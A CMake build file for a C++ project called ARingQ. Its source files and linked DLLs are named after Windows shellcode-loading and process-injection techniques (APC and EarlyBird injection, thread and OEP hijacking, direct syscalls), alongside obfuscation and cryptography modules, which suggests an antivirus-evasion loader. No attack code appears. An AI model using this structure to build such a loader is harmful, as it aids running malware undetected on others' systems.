cmake_minimum_required(VERSION 3.27)
project(ARingQ)

set(CMAKE_CXX_STANDARD 14)

include_directories(include)

set(LINK_DIR ./lib)
link_directories(${LINK_DIR})

set(CMAKE_RUNTIME_OUTPUT_DIRECTORY ${CMAKE_CURRENT_SOURCE_DIR}/bin)

add_executable(ARingQ
        src/main.cpp
        include/utils.h
        src/utils.cpp
        include/Parameter.h
        src/Parameter.cpp
        include/Confusion.h
        src/Confusion.cpp
        src/Cryptography.cpp
        include/Cryptography.h
        src/Launch.cpp
        include/Launch.h
        src/File.cpp
        include/File.h
        src/Core.cpp
        include/Core.h
        include/TLSLoad.h
        src/TLSLoad.cpp
        plugin/directlyLoad.h
        plugin/apcLoad.h
        plugin/createThreatPoolWaitLoad.h
        plugin/dynamicLoad.h
        plugin/dynamicLoadPlusLoad.h
        plugin/EarlyBirdAPC_InjetcLoad.h
        plugin/fiberLoad.h
        plugin/ntCreateSectionLoad.h
        plugin/ntTestAlertLoad.h
        plugin/OEPHiijack_InjectLoad.h
        plugin/SEHExceptLoad.h
        plugin/syscallLoad.h
        src/TLSLoad.cpp
)

target_link_libraries(ARingQ ApcInjectLoad.dll
        CreateThreatPoolWaitLoad.dll
        DynamicLoad.dll
        DynamicLoadPlus.dll
        FiberLoad.dll
        EarlyBirdAPC_InjetcLoad.dll
        OEPHiijack_InjectLoad.dll
        SEHExceptLoad.dll
        SyscallLoad.dll
        ThreadHiijack_InjectLoad.dll
        NtTestAlertLoad.dll
        NtCreateSectionLoad.dll
        DirectlyLoad.dll)